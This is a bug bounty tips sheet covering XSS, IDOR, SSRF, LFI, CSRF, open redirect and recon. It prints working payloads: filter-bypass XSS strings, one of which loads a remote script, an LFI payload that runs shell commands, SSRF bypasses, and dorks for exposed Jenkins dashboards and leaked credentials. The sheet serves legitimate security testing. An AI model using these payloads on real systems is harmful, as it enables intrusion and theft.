# Bug Bounty Tips

### Recon
- Don't stop when you see the response forbidden/not found on the target you are testing, run dirsearch or any tool you prefer to find endpoints, like recon in [this writeup](https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd); or google the site (site:domain.com) you may find an endpoint which is accessible, like in [this writeup](https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241).

### XSS
- I love it when a site creates a filter to 'try' prevent something like XSS (or even certain file extensions from being uploaded:D). In this case, [xss filter bypass: </script><%0dscript%20src=\http://mysite.com/yay.js>](https://www.bugbountynotes.com/forum/viewpost?id=100)
- Have you ever come across an issue, where you could pop XSS but parenthesis () gets filtered ? this payload ``onfocus="alert`1`"autofocus=`` will bypass that problem.
- "URL-encoding payload symbols" AND "The fragment(`#`) isn’t sent to the server - this means that no server-side firewall can see it, so it cannot stop attacks coming from this direction."
  - `https://www.bugbountytraining.com/challenges/challenge-10.php#?message=%3Cimg%20src%3Ddumm%20onerror%3Dalert(%22xss%22)%3E`
  - `https://www.bugbountytraining.com/challenges/challenge-10.php?message=#%3Cimg%20src%3Ddumm%20onerror%3Dalert(%22xss%22)%3E`
- The obstacle was to made the JavaScript code execute without error (the browser stops script execution on the first error).
  - ``http://try.harisec.com/chals/qli/?q=testing\&format=});alert(1);a=function(){`;%3C!--``
  - The trick here was to use an unusual way to comment the JavaScript code until the end of line (`<!--`) as the usual sequence `//` was also encoded.
  - The last trick was to use ES6 template strings ``(`)`` to be able to combine two reflections and finally exploit the injection.
```
      <script type="text/javascript">
        function init() {
          $(document).ready(function () {
            logTrackingData({searchType:"simple",query:"testing\",format:"});alert(1);a=function(){`;&lt;!--",pageId:"12345",pageNo:"1",searchCategory:"210",suggestions:"",results:""});
          })
        }
      </script>
```
- You can bypass a lot of XSS filters using HTML comments. They bypass it because they don't look/act like other tags. You can sometimes insert additional HTML too.
  - Example: `<!----><script>alert(0);</script>`
- By removing the "Content Security Policy" header from the response, we could check if the alert box not popping because of CSP. Or we could check CSP violation error message in "Console" in Chrome debug tool.
- If you open the url in the browser and see nothing but blank page, do not assume there is nothing there.
  - ALWAYS check the source code. There might be a bunch of JavaScript or e.g. some commented source code from server.
- ALWAYS check the full response on any request. Errors can sometimes give u the keys to the kingdom if u actually figure out what ur looking at witin the error response.

### IDOR

- When you're looking at an asset that may use a microservices architecture, look for IDOR vulnerabilities using path traversal. E.g. `https://example/?id=1/../2`.
  - The authorization check may pass because the user is allowed to see resource 1 and the system ignores /../2 in the authorization layer. This could work because some microservice architectures use HTTP to transport messages.
  - When one of the microservices implemented an HTTP endpoint like "/resource/:id" and it trusts the message from the sender, you may end up requesting "/resource/1/../2", which resolves to "/resource/2", given you access to an object you may not be authorized to see.
  - Yeah, I have encountered several issues of this type. like `https://example/?id=1/.../..../..../id=2` but never ended up in path traversal vulnerabilities.

### Information Disclosure

- Want to find some internal code of companies or some sample codes of new features? Checkout with: `site:http://repl.it  intext:<companydomain>`. In companydomain, if you know the internal domain it is even better.
  - `site:http://gist.github.com`
- Search for public Trello boards of companies, to find login credentials, API keys, etc. Or if you aren't lucky enough, then you may find companies' Team Boards sometimes with tasks to fix security vulnerabilities.

### SSRF

- a = Find fixed SSRF. b = Find open redirection in whitelisted domains. C = Amazon Aws metadata API.
  - a+b+C = Boom.
- Just had a weird SSRF 'bypass' which would only pull data from their domain so anything you queried would be `hxxps://www.theirdomain.com/reflectedhere/`. Weirdly using `/%2F//mysite.com/` caused it to hit external sites.

### LFI

- When lfi doesnt work to get `/etc/passwd` for example, you can always try to get source code disclosure by using the function of php://filter: `php://filter/convert.base64-encode/resource=index`
- When you came up with a file= parameter before trying for other rfi see phpinfo page is accessible or not you might get some juicy information. e.g.`file=data:text/plain, <?php phpinfo(); ?>`
  - Why prefer phpinfo() when you can `data:text/plain, <?php echo shell_exec("ls"); ?>`? (in both cases, allow_url_include=1).
  
### CSRF

- When testing for CSRF, send the POST parameters using GET method, eg: `GET /[post endpoint]?postprm1=value&postprm2=value2`. You will be surprised how many developers forget to add csrf protection on GET methods of the same endpoints.
- I'm going to tell you about the coolest CSRF 'bypass' I found (/sarcasm). CSRF token was sent with the POST request. Change to GET and remove the CSRF token => request works. 
  
### Higher Privilege

- If a website does not verify email, try signing up with <whatev>@domain.com (the company email). Sometimes this gives you higher privilege like deleting/viewing any other user's profiles etc.
  
### Hiden Endpoints

- A redirect to SSO does not always mean that every endpoints are behind the SSO. Specially if it is a popular instance like JIRA, Confluence etc, check to see if you can still hit endpoints like search sections, filters etc.

### Jenkins

- Sometime an open Jenkins dashboard can be as critical as below finding. A Shodan query to list all such publically accessible Jenkins Instance: `https://www.shodan.io/search?query=x-jenkins+200`
- sometimes you find those PATHs that forwards to a login page & you can't see the content inside them (ex: `/path/to/secret` --> Google login).
  - Take all these PATHs, prepend `/public/` to all of them as: `/public/path/to/secret`, got access to a Jenkins instance.

### HTTP Methods

- If server only allows GET and POST method, then try adding "X-HTTP-Method -Override: PUT to achieve RCE via PUT method.

### Open Redirection

- For Open Redirects you can bypass a lot of WAF using a special character which a lot of browsers (such as FireFox) convert into a '.' which will complete your URL.
  - The character is: 。
  - Usage: redirecthere。com
- There is no redirect using location header and the response code is 200 but the author still got redirected, which can mean only one thing, the redirect performed using javascript in the browser. Usually it means something like this: `window.location.href = nextURL;`. In theory if someone can control the `nextURL` parameter, he can perform XSS: `window.location.href = javascript:alert(1);//` or `window.location.href = data:text/html;HTML_CODE`.
- Using "Content Security Policy" to define which sources are allowed to be loaded could stop browser following 302 redirection (If this works, CSP violation error message will show in "Console" in Chrome debug tool). As show in [this writeup](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/).

### TOOLS
  
- Don't forget the google dorks, sometimes when you can't find nothing, let google find something for you. Check [this list of advanced google dorks](https://pastebin.com/zYPZNbMK) and use them.
  - Use of Google dorks and the site operator is a good way to identify vulnerable apps on sites with bounty. The inurl:/OA_HTML to get [unpatched instances with XSS or SQLi](https://the-infosec.com/2018/11/06/oracle-ebs-security-auditing/) is one of them.
  - To discover domains deployed on Github for subdomain takeover, following google dork can be used :- intext:"There isn't a Github Pages site here" and intitle:"Site not found · GitHub Pages".
- Always check the error message in "Console" in Chrome debug tool.
- Debugging Javascript can yield gold. You can edit source files directly by enabling "Local Overides" in Chrome. Changes made will persist, even after you refresh the page! 
